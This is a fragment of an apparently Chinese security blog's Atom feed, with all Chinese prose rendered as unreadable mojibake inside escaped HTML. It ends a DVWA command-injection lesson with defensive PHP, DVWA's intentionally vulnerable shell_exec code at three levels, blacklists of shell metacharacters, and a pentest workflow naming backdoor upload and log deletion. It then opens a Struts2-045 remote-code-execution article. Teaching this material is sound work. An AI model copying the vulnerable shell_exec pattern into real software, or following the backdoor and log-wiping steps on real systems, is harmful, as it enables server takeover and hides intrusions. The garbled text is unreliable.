class=&#34;hljs-string&#34;&gt;&amp;#x27;)&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#123;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#125;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;[&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;]&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$dangerous&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$input&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;ä½¿ç”¨å®‰å…¨çš„API&#34;&gt;&lt;a href=&#34;#ä½¿ç”¨å®‰å…¨çš„API&#34; class=&#34;headerlink&#34; title=&#34;ä½¿ç”¨å®‰å…¨çš„API&#34;&gt;&lt;/a&gt;ä½¿ç”¨å®‰å…¨çš„API&lt;/h3&gt;&lt;h4 id=&#34;é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤&#34;&gt;&lt;a href=&#34;#é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤&#34; class=&#34;headerlink&#34; title=&#34;é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤&#34;&gt;&lt;/a&gt;é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// ä¸å®‰å…¨çš„æ–¹å¼&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// å®‰å…¨çš„æ–¹å¼ï¼šä½¿ç”¨ä¸“é—¨çš„å‡½æ•°&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;securePing&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;filter_var&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$ip&lt;/span&gt;, FILTER_VALIDATE_IP)) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// ä½¿ç”¨socketæˆ–å…¶ä»–å®‰å…¨æ–¹å¼å®ç°pingåŠŸèƒ½&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-comment&#34;&gt;// è€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤&lt;/span&gt;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;æƒé™æ§åˆ¶&#34;&gt;&lt;a href=&#34;#æƒé™æ§åˆ¶&#34; class=&#34;headerlink&#34; title=&#34;æƒé™æ§åˆ¶&#34;&gt;&lt;/a&gt;æƒé™æ§åˆ¶&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;æœ€å°æƒé™åŸåˆ™&lt;/strong&gt;ï¼šWebåº”ç”¨ç¨‹åºåº”è¯¥ä»¥æœ€å°æƒé™ç”¨æˆ·è¿è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç¦ç”¨å±é™©å‡½æ•°&lt;/strong&gt;ï¼šåœ¨php.iniä¸­ç¦ç”¨&lt;code&gt;exec&lt;/code&gt;, &lt;code&gt;shell_exec&lt;/code&gt;, &lt;code&gt;system&lt;/code&gt;ç­‰å‡½æ•°&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ²™ç®±ç¯å¢ƒ&lt;/strong&gt;ï¼šå°†Webåº”ç”¨ç¨‹åºè¿è¡Œåœ¨å—é™çš„ç¯å¢ƒä¸­&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ä»£ç å®¡è®¡&#34;&gt;&lt;a href=&#34;#ä»£ç å®¡è®¡&#34; class=&#34;headerlink&#34; title=&#34;ä»£ç å®¡è®¡&#34;&gt;&lt;/a&gt;ä»£ç å®¡è®¡&lt;/h3&gt;&lt;p&gt;å®šæœŸè¿›è¡Œä»£ç å®‰å…¨å®¡è®¡ï¼Œé‡ç‚¹å…³æ³¨ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç”¨æˆ·è¾“å…¥å¤„ç†&lt;/li&gt;
&lt;li&gt;ç³»ç»Ÿå‘½ä»¤è°ƒç”¨&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶æ“ä½œ&lt;/li&gt;
&lt;li&gt;æ•°æ®åº“æŸ¥è¯¢&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ğŸ“Š-å®‰å…¨ç­‰çº§åˆ†æ&#34;&gt;&lt;a href=&#34;#ğŸ“Š-å®‰å…¨ç­‰çº§åˆ†æ&#34; class=&#34;headerlink&#34; title=&#34;ğŸ“Š å®‰å…¨ç­‰çº§åˆ†æ&#34;&gt;&lt;/a&gt;ğŸ“Š å®‰å…¨ç­‰çº§åˆ†æ&lt;/h2&gt;&lt;h3 id=&#34;DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶&#34;&gt;&lt;a href=&#34;#DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶&#34; class=&#34;headerlink&#34; title=&#34;DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶&#34;&gt;&lt;/a&gt;DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶&lt;/h3&gt;&lt;h4 id=&#34;Lowçº§åˆ«&#34;&gt;&lt;a href=&#34;#Lowçº§åˆ«&#34; class=&#34;headerlink&#34; title=&#34;Lowçº§åˆ«&#34;&gt;&lt;/a&gt;Lowçº§åˆ«&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// å®Œå…¨æ²¡æœ‰è¿‡æ»¤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;Mediumçº§åˆ«&#34;&gt;&lt;a href=&#34;#Mediumçº§åˆ«&#34; class=&#34;headerlink&#34; title=&#34;Mediumçº§åˆ«&#34;&gt;&lt;/a&gt;Mediumçº§åˆ«&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// ç®€å•çš„é»‘åå•è¿‡æ»¤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;amp;&amp;amp;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;), &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;Highçº§åˆ«&#34;&gt;&lt;a href=&#34;#Highçº§åˆ«&#34; class=&#34;headerlink&#34; title=&#34;Highçº§åˆ«&#34;&gt;&lt;/a&gt;Highçº§åˆ«&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// æ›´ä¸¥æ ¼çš„è¿‡æ»¤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;]);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$substitutions&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;amp;&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;| &amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;-&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;$&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;(&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;)&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;`&amp;#x27;&lt;/span&gt;  =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;    &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;||&amp;#x27;&lt;/span&gt; =&amp;gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;br&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;array_keys&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$substitutions&lt;/span&gt;), &lt;span class=&#34;hljs-variable&#34;&gt;$substitutions&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h2 id=&#34;ğŸ“-å­¦ä¹ è¦ç‚¹&#34;&gt;&lt;a href=&#34;#ğŸ“-å­¦ä¹ è¦ç‚¹&#34; class=&#34;headerlink&#34; title=&#34;ğŸ“ å­¦ä¹ è¦ç‚¹&#34;&gt;&lt;/a&gt;ğŸ“ å­¦ä¹ è¦ç‚¹&lt;/h2&gt;&lt;h3 id=&#34;å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“&#34;&gt;&lt;a href=&#34;#å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“&#34; class=&#34;headerlink&#34; title=&#34;å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“&#34;&gt;&lt;/a&gt;å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;æ¼æ´æˆå› &lt;/strong&gt;ï¼šç¼ºä¹è¾“å…¥éªŒè¯å’Œè¾“å‡ºè¿‡æ»¤&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;åˆ©ç”¨æ–¹æ³•&lt;/strong&gt;ï¼šå‘½ä»¤è¿æ¥ç¬¦ã€ç‰¹æ®Šå­—ç¬¦ç»•è¿‡&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å±å®³ç¨‹åº¦&lt;/strong&gt;ï¼šæœåŠ¡å™¨å®Œå…¨æ§åˆ¶ã€æ•°æ®æ³„éœ²&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;é˜²æŠ¤ç­–ç•¥&lt;/strong&gt;ï¼šè¾“å…¥éªŒè¯ã€æƒé™æ§åˆ¶ã€å®‰å…¨ç¼–ç &lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;æ¸—é€æµ‹è¯•æµç¨‹&#34;&gt;&lt;a href=&#34;#æ¸—é€æµ‹è¯•æµç¨‹&#34; class=&#34;headerlink&#34; title=&#34;æ¸—é€æµ‹è¯•æµç¨‹&#34;&gt;&lt;/a&gt;æ¸—é€æµ‹è¯•æµç¨‹&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;ä¿¡æ¯æ”¶é›†&lt;/strong&gt;ï¼šç¡®å®šç›®æ ‡å’Œæ”»å‡»é¢&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ¼æ´å‘ç°&lt;/strong&gt;ï¼šå¯»æ‰¾å‘½ä»¤æ‰§è¡Œç‚¹&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ¼æ´éªŒè¯&lt;/strong&gt;ï¼šç¡®è®¤æ¼æ´å­˜åœ¨&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ¼æ´åˆ©ç”¨&lt;/strong&gt;ï¼šè·å–ç³»ç»Ÿæƒé™&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æƒé™ç»´æŒ&lt;/strong&gt;ï¼šä¸Šä¼ åé—¨ã€å»ºç«‹æŒä¹…è¿æ¥&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç—•è¿¹æ¸…ç†&lt;/strong&gt;ï¼šåˆ é™¤æ—¥å¿—ã€æ¢å¤ç³»ç»ŸçŠ¶æ€&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;âš ï¸-å…è´£å£°æ˜&#34;&gt;&lt;a href=&#34;#âš ï¸-å…è´£å£°æ˜&#34; class=&#34;headerlink&#34; title=&#34;âš ï¸ å…è´£å£°æ˜&#34;&gt;&lt;/a&gt;âš ï¸ å…è´£å£°æ˜&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡å†…å®¹ä»…ä¾›ç½‘ç»œå®‰å…¨å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ä»»ä½•ä¸ªäººæˆ–ç»„ç»‡ä½¿ç”¨æœ¬æ–‡ä¿¡æ¯è¿›è¡Œçš„è¿æ³•æ´»åŠ¨ï¼Œå‡ä¸ä½œè€…æ— å…³ã€‚è¯»è€…åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œåœ¨åˆæ³•æˆæƒçš„ç¯å¢ƒä¸‹è¿›è¡Œå®‰å…¨æµ‹è¯•ã€‚&lt;/p&gt;
</content>
        <category term="æ¸—é€æµ‹è¯•" />
        <category term="Webå®‰å…¨" />
        <category term="å‘½ä»¤æ‰§è¡Œ" />
        <category term="æ¼æ´åˆ©ç”¨" />
        <updated>2025-07-26T10:53:13.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
        <title>Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
        <content type="html">&lt;h1 id=&#34;Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ&#34;&gt;&lt;a href=&#34;#Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ&#34; class=&#34;headerlink&#34; title=&#34;Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ&#34;&gt;&lt;/a&gt;Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ&lt;/h1&gt;&lt;h2 id=&#34;æ¼æ´æ¦‚è¿°&#34;&gt;&lt;a href=&#34;#æ¼æ´æ¦‚è¿°&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´æ¦‚è¿°&#34;&gt;&lt;/a&gt;æ¼æ´æ¦‚è¿°&lt;/h2&gt;&lt;p&gt;Struts2-045ï¼ˆCVE-2017-5638ï¼‰æ˜¯Apache Struts2æ¡†æ¶ä¸­çš„ä¸€ä¸ªä¸¥é‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´å› å…¶å½±å“èŒƒå›´å¹¿ã€åˆ©ç”¨ç®€å•è€Œå¤‡å—å…³æ³¨ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„Content-Typeè¯·æ±‚å¤´ï¼Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚&lt;/p&gt;
&lt;h2 id=&#34;æ¼æ´åŸºæœ¬ä¿¡æ¯&#34;&gt;&lt;a href=&#34;#æ¼æ´åŸºæœ¬ä¿¡æ¯&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´åŸºæœ¬ä¿¡æ¯&#34;&gt;&lt;/a&gt;æ¼æ´åŸºæœ¬ä¿¡æ¯&lt;/h2&gt;&lt;h3 id=&#34;å½±å“ç‰ˆæœ¬&#34;&gt;&lt;a href=&#34;#å½±å“ç‰ˆæœ¬&#34; class=&#34;headerlink&#34; title=&#34;å½±å“ç‰ˆæœ¬&#34;&gt;&lt;/a&gt;å½±å“ç‰ˆæœ¬&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.3.5 - 2.3.31&lt;/strong&gt;ï¼ˆåŒ…å«2.3.31ç‰ˆæœ¬ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Apache Struts 2.5.0 - 2.5.10&lt;/strong&gt;ï¼ˆåŒ…å«2.5.10ç‰ˆæœ¬ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ¼æ´ç­‰çº§&#34;&gt;&lt;a href=&#34;#æ¼æ´ç­‰çº§&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´ç­‰çº§&#34;&gt;&lt;/a&gt;æ¼æ´ç­‰çº§&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVSSè¯„åˆ†&lt;/strong&gt;: 10.0ï¼ˆä¸¥é‡ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ¼æ´ç±»å‹&lt;/strong&gt;: è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;æ”»å‡»å¤æ‚åº¦&lt;/strong&gt;: ä½&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;æ ¸å¿ƒåŸç†&#34;&gt;&lt;a href=&#34;#æ ¸å¿ƒåŸç†&#34; class=&#34;headerlink&#34; title=&#34;æ ¸å¿ƒåŸç†&#34;&gt;&lt;/a&gt;æ ¸å¿ƒåŸç†&lt;/h3&gt;&lt;p&gt;Struts2æ¡†æ¶åœ¨å¤„ç†æ–‡ä»¶ä¸Šä¼ è¯·æ±‚æ—¶ï¼Œä¼šè§£æContent-Typeè¯·æ±‚å¤´ã€‚å½“Content-Typeæ ¼å¼ä¸æ­£ç¡®æ—¶ï¼Œæ¡†æ¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œ&lt;strong&gt;å¼‚å¸¸å¤„ç†è¿‡ç¨‹ä¸­ä¼šå¯¹é”™è¯¯ä¿¡æ¯è¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æ&lt;/strong&gt;ï¼Œè¿™å°±ç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºã€‚&lt;/p&gt;
